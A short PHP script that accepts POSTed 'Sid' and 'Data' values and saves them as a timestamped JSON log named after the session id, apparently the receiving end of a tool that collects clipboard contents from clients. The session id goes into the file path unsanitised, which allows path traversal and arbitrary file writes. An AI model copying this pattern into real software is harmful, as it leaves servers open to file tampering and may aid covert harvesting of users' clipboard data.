<?php
header('Content-Type: text/html');
{
  $sid = isset($_POST['Sid']) ? $_POST['Sid'] : 'unknown';
  $data = isset($_POST['Data']) ? $_POST['Data'] : '';
  $timestamp = date('Y-m-d H:i:s');

  $entry = array(
    'data' => $data,
    'timestamp' => $timestamp,
    'sid' => $sid
  );

  $json_data = json_encode($entry);
  $f = fopen('../../logs/' . $sid . '.clipboard.json', 'w+');
  fwrite($f, $json_data);
  fclose($f);
}
?>
